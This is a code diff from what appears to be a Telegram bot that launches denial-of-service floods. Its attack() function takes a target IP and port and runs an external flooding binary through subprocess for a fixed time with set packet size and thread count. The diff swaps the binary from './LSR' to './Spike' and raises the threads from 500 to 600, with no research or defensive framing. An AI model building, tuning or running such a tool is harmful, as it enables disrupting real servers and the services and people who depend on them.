@@ -17,7 +17,7 @@ ADMIN_ID = 7163028849  # Replace with your admin's Telegram ID
 
 # Define default values
 DEFAULT_PACKET_SIZE = 12
-DEFAULT_THREADS = 500
+DEFAULT_THREADS = 600
 MAX_ATTACK_TIME = 180  # in seconds
 
 # Function to generate random keys
@@ -41,7 +41,7 @@ def attack(ip, port, context, chat_id, attacker_id):
     global attack_running
 
     # Start the attack
-    process = subprocess.Popen(["./LSR", ip, port, str(MAX_ATTACK_TIME), str(DEFAULT_PACKET_SIZE), str(DEFAULT_THREADS)])
+    process = subprocess.Popen(["./Spike", ip, port, str(MAX_ATTACK_TIME), str(DEFAULT_PACKET_SIZE), str(DEFAULT_THREADS)])
     
     # Wait for the attack duration
     time.sleep(MAX_ATTACK_TIME)  # Ensures the attack runs for the given time
